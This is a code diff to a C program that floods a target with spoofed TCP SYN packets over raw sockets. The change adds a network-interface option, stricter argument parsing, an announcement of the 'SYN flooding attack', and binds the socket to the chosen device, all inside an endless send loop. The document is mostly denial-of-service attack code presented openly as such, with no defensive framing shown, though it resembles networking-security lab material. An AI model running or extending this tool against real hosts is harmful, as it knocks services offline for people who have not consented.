@@ -55,11 +55,11 @@ struct pseudo_tcp
 
 unsigned short calculate_tcp_checksum(struct ipheader *ip);
 unsigned short in_cksum(unsigned short *buf, int length);
-void send_raw_ip_packet(struct ipheader* ip);
+void send_raw_ip_packet(struct ipheader* ip, const char* interface);
 
 int main(int argc, char *argv[]) {
-    if (argc != 5) {
-        fprintf(stderr, "Usage: %s -d <destination_ip> -p <destination_port>\n", argv[0]);
+    if (argc != 7 || strcmp(argv[1], "-i") != 0 || strcmp(argv[3], "-d") != 0 || strcmp(argv[5], "-p") != 0) {
+        fprintf(stderr, "Usage: %s -i <interface> -d <destination_ip> -p <destination_port>\n", argv[0]);
         return 1;
     }
 
@@ -68,8 +68,11 @@ int main(int argc, char *argv[]) {
     struct tcpheader *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));
 
     // Parse command line arguments
-    char *dest_ip = argv[2];
-    int dest_port = atoi(argv[4]);
+    const char* interface = argv[2];
+    char *dest_ip = argv[4];
+    int dest_port = atoi(argv[6]);
+
+    printf("Starting the SYN flooding attack from the %s interface...\n", interface);
 
     srand(time(0)); // Initialize the seed for random # generation.
     while(1) {
@@ -98,7 +101,7 @@ int main(int argc, char *argv[]) {
         tcp->tcp_sum = calculate_tcp_checksum(ip);
 
         // Send the spoofed packet
-        send_raw_ip_packet(ip);
+        send_raw_ip_packet(ip, interface);
     }
     return 0;
 }
@@ -151,7 +154,7 @@ unsigned short in_cksum(unsigned short *buf, int length) // this function calcul
     return (unsigned short) (~sum);
 }
 
-void send_raw_ip_packet(struct ipheader* ip)
+void send_raw_ip_packet(struct ipheader* ip, const char* interface)
 {
     struct sockaddr_in dest_info;
     int enable=1;
@@ -166,9 +169,16 @@ void send_raw_ip_packet(struct ipheader* ip)
     dest_info.sin_family = AF_INET;
     dest_info.sin_addr = ip->iph_destip;
 
-    // Step 4: Send the packet out.
+    // Step 4: Set the network interface
+    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, interface, strlen(interface)) < 0) {
+        perror("Error setting interface");
+        close(sock);
+        return;
+    }
+
+    // Step 5: Send the packet out.
     sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
 
-    // Step 5: Close the packet
+    // Step 6: Close the socket
     close(sock);
 }
